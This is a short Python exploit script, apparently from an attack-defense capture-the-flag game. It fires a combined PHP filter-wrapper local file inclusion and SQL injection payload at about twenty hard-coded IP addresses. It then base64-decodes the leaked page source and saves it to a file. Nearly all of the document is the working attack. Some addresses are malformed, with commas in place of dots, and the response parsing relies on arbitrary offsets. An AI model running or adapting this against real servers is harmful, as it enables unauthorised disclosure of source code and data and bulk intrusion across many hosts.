import requests
import base64

ips = ['108.137.78.179',
'108.137.124.12',
'108.137.9.116',
'108.136.138.33',
'108.137.80.77',
'108.136.242.32',
'108.137.89.10',
'108.137.98.237',
'108.136.184.1',
'108,137,153,176',
'108.137.62.86',
'108,137,123,137',
'108.137.55.136',
'108,136,150,147',
'108.137.94.244',
'108.137.80.112',
'108.137.9.155',
'108.137.91.40',
'108.137.70.31']
payload = "php://filter/convert.base64-encode/resource=member&name=%27or%201=1--%20-"

with open("tmp.txt", "w") as f:
    for ip in ips:
        IP = ip
    
        def req(ip=IP):
            try:
                res = requests.get(f"http://{ip}/index.php?page={payload}")
                # f.write(f"==={ip}==={res.text}")
                a = res.text[350+10+10+10:]
                f.write(f"ip: {ip} \n{base64.b64decode(a[:-(10+6)]).decode()}\n")
            except: pass
        req()
